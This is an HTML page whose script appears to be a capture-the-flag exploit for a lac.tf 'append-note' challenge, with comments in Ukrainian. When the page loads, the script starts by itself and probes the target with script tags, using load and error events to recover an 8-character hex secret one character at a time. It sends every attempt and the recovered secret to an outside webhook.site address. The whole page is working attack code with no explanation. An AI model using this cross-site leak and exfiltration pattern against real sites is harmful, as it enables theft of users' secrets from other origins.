<!DOCTYPE html>
<html>
<body>
    <h1 id="status">Ready</h1>
    <script>
        const TARGET = "https://append-note-voboi.instancer.lac.tf";
        const WEBHOOK = "https://webhook.site/706d65f1-4c2c-4c61-b226-7d388e69f359";
        const ALPHABET = "0123456789abcdef";
        let secret = "";

        // Функція для логування на вебхук
        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});

        function probe(testStr) {
            return new Promise((resolve) => {
                const s = document.createElement('script');
                // Додаємо випадковий URL параметр, щоб обійти валідацію host в app.py
                s.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/`;
                
                // Якщо 200 OK, спрацює onload (навіть якщо вміст не JS)
                s.onload = () => {
                    cleanup();
                    resolve(true);
                };
                
                // Якщо 404 Not Found, спрацює onerror
                s.onerror = () => {
                    cleanup();
                    resolve(false);
                };

                const cleanup = () => {
                    if (s.parentNode) document.body.removeChild(s);
                };

                document.body.appendChild(s);
                // Короткий таймаут, щоб не чекати вічно
                setTimeout(() => { cleanup(); resolve(false); }, 800);
            });
        }

        async function solve() {
            report("Starting_Exploit");
            for (let i = 0; i < 8; i++) {
                for (let char of ALPHABET) {
                    let attempt = secret + char;
                    document.getElementById('status').innerText = "Testing: " + attempt;
                    report("TRY:_" + char + "_attempt:_" + attempt);
                    if (await probe(attempt)) {
                        secret += char;
                        report("Found_Char:_" + char + "_Current:_" + secret);
                        break; 
                    }
                }
            }
            report("SUCCESS_FINAL_SECRET:_" + secret);
        }

        // Запускаємо автоматично через 1 сек після завантаження
        setTimeout(solve, 1000);
    </script>
</body>
</html>
